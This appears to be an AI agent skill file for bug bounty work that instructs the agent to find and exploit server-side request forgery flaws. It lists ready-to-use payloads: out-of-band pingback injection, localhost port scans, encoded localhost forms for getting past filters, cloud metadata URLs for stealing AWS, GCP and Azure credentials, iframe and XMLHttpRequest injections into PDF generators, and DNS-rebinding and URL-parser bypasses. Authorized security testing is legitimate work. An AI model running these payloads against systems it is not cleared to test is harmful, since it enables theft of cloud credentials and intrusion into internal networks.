---
name: bbp-ssrf-hunter
description: Specialized skill for finding and exploiting Server-Side Request Forgery (SSRF) vulnerabilities using out-of-band techniques and cloud metadata extraction.
---

# SSRF Hunter Skill

This skill is designed to locate, validate, and exploit Server-Side Request Forgery (SSRF) vulnerabilities. Use this skill when you encounter endpoints that fetch external resources (e.g., URLs in parameters, webhook configurations, PDF generators, or image downloaders).

## Workflow

### 1. Discovery (Blind SSRF)
- Use `interactsh-client` to generate an OAST (Out-of-Band Application Security Testing) payload.
- Inject the payload into suspicious parameters (`url=`, `dest=`, `path=`, `webhook=`, `api=`).
- Check headers as well: `Referer`, `X-Forwarded-For`, `X-Real-IP`, `Contact`.
- Look for incoming DNS or HTTP requests on your `interactsh` client.

### 2. Validation & Pivot (Internal Network)
Once a pingback is received, attempt to scan the internal network:
- Port scan localhost: `http://127.0.0.1:22`, `http://127.0.0.1:80`, `http://127.0.0.1:6379` (Redis).
- Check for alternative representations of localhost to bypass filters:
  - `http://2130706433/` (Decimal)
  - `http://0x7f000001/` (Hex)
  - `http://0177.0.0.01/` (Octal)
  - `http://127.1/` (Short)
  - `http://localtest.me/` (DNS resolution to 127.0.0.1)

### 3. Cloud Metadata Exploitation (High Impact)
If the application is hosted on AWS, GCP, or Azure, attempt to read metadata credentials.
- **AWS:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- **AWS (IMDSv2 Bypass):** Requires `X-aws-ec2-metadata-token` header if possible.
- **GCP:** `http://metadata.google.internal/computeMetadata/v1/` (Requires `Metadata-Flavor: Google` header).
- **Azure:** `http://169.254.169.254/metadata/instance?api-version=2017-04-02` (Requires `Metadata: true` header).

### 4. PDF Generators & Headless Browsers
If the application generates PDFs from HTML or user input:
- Try iframe injection: `<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>`
- Try JavaScript injection: `<script>x=new XMLHttpRequest();x.open('GET','http://169.254.169.254/latest/meta-data/');x.send();</script>`

## Bypassing SSRF Filters
- **DNS Rebinding:** Use services like `rbndr.us` to trick the validator. The first DNS lookup returns a safe IP, the second lookup returns `127.0.0.1`.
- **Open Redirects:** Chain an Open Redirect on the target domain to bounce the SSRF request to an internal IP.
- **URL Parsers:** Exploit discrepancies in how different libraries parse URLs (e.g., `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`).
